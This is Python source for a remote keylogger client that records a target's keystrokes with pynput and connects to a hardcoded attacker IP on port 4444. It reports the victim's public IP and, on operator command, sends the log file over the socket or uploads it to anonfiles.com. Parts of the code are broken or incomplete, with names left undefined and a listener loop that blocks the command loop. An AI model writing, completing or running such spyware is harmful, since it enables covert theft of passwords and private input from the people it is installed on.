import socket
from anonfile import AnonFile
from worker.methods import *
from online_kl.client.worker.methods import *
from online_kl.client.worker.encode import encryption
import shutil
import requests
import os
from pynput.keyboard import Listener
from datetime import date
import threading

dataToday = date.today()  # gets date


class OnlineKeylogger:
    def __init__(self):
        self.port = 4444  # config["port"]
        self.ip = "87.21.164.158"  # config["ip"]
        self._DEFAULT_SIZE = 1024
        self._ENCODING_FORMAT = "UTF-8"
        self.client = socket.socket()

    def send(self, args, encode=None):
        if encode is None:
            return self.client.send(args)
        else:
            return self.client.send(bytes(args).decode(encode))

    def recv(self, size, encode):
        return self.client.recv(size).decode(encode)

    def anonfile(self, file):
        anon = AnonFile()
        upload = anon.upload(file)
        return upload.url.geturl()

    def join(self):
        with open(f"{path}{fileName}", "a") as f:
            f.write(str(dataToday) + "\n")
            f.close()

        with Listener(on_press=on_press) as ls:
            while True:
                ls.join()

    def transferFile(self, file):
        file_size = os.path.getsize(file)
        file_name = os.path.basename(file)
        self.send(str(file_name), self._ENCODING_FORMAT)
        self.send(str(file_size), self._ENCODING_FORMAT)
        file = open(file, "rb")
        byt = file.read(file_size)
        while True:
            if byt:
                self.client.send(byt)
                file.close()
                break
            else:
                break

    def connectionHandle(self):
        try:
            print("Connecting to a server")
            self.client.connect((self.ip, self.port))

        except (TimeoutError, ConnectionRefusedError):
            self.connectionHandle()

        target_ip = requests.get("https://checkip.amazonaws.com").text.strip()
        target_system = "Darksnake"
        self.client.send(bytes(target_ip, self._ENCODING_FORMAT))
        self.client.send(bytes(target_system, self._ENCODING_FORMAT))
        print("Connected")
        self.join()
        while True:
            command = self.recv(self._DEFAULT_SIZE, self._ENCODING_FORMAT)
            if command == "help":
                command_list = """
                    ---------------------------------------------------------------------------------------------------------------------
                    Keylogger commands
                    ---------------------------------------------------------------------------------------------------------------------
                    
                    help                 displays this commands 
                    transfer             transfer the stored txt file with encrypted logs to your pc
                    upload file          upload encrypted logs to anonfiles.com and returns the link
                    realtime kl          starts logging all the keys
                    
                    ---------------------------------------------------------------------------------------------------------------------
                    exit                 closes connection between you and the target
        """
            elif command == "transfer":
                status = self.transferFile(f"{path}{fileName}")

                #self.send(status, self._ENCODING_FORMAT)


                print("sent")

            elif command == "upload file":
                link = self.anonfile(fileName)
                self.send(bytes(link), self._ENCODING_FORMAT)

            elif command == "realtime keylogger":
                pass


if __name__ == "__main__":
    kl = OnlineKeylogger()
    threading.Thread(target=kl.connectionHandle()).start()